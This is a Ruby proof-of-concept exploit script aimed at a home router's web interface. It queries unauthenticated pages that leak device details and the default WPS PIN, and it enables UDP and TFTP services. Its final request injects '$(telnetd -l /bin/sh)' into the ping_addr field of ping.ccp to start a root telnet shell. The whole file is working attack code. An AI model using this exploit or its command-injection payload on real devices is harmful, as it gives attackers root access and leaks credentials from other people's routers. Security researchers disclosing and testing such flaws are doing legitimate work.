# NCC2 PoC.

require 'pp'
require 'optparse'
require 'restclient'

# Set defaults and parse command line arguments
options = {}

options[:addr] = "192.168.0.1"
options[:port] = 80

OptionParser.new do |option|

  option.on("--address [ADDRESS]", "Destination hostname or IP") do |a|
    options[:addr] = a
  end

  option.on("--port [PORT]", "Destination TCP port") do |p|
    options[:port] = p
  end

  option.parse!

end

# Define which SOAPActions we will be using.
actions = [
  {
    :name => "Get device information",
    :call => "sloppy_parser",
    :path => "chklst.txt",
  },
  {
    :name => "Has USB device connected",
    :call => "txt_parser",
    :path => "usb_connect.txt",
  },
  {
    :name => "Get WPS default pin",
    :call => "txt_parser",
    :path => "wps_default_pin.txt",
  },
  {
    :name => "Enable UDPServer",
    :call => "noop",
    :path => "test_mode.txt",
  },
  {
    :name => "Enable TFTP service",
    :call => "noop",
    :path => "tftpd_ready.txt",
  },
  {
    :name => "Enable telnet (root)",
    :call => "noop",
    :path => "ping.ccp",
    :post => {
      "ccp_act" => "ping_v6",
      "ping_addr" => "$(telnetd -l /bin/sh)"
    }
  }
]

def noop(val)
  return
end

def sloppy_parser(slop)
  slop.split(/\<br \/\>/).each do |l|
    puts "    #{l}"
  end
end

def txt_parser(txt)
  l = txt.gsub(/\=/, ': ')
  puts "    #{l}"
end

# Iterate over all actions and attempt to execute.
url = "http://#{options[:addr]}:#{options[:port]}"

puts "[!] Attempting to extract information from #{url}"

actions.each do |action|

  # Build the target URL and setup the HTTP client object.
  request = RestClient::Resource.new("#{url}/#{action[:path]}")

  # Fire the request and ensure a 200 OKAY.
  begin
    if action[:post]
      response = request.post(action[:post])
    else
      response = request.get()
    end
  rescue
    puts "[!] Failed to query remote host."
    abort
  end

  if response.code != 200
    puts "[-] '#{action[:name]}' failed with response: #{response.code}"
    next
  end

  # Send to the processor.
  puts "[*] #{action[:name]} request succeeded."
  send(action[:call], response.body())

end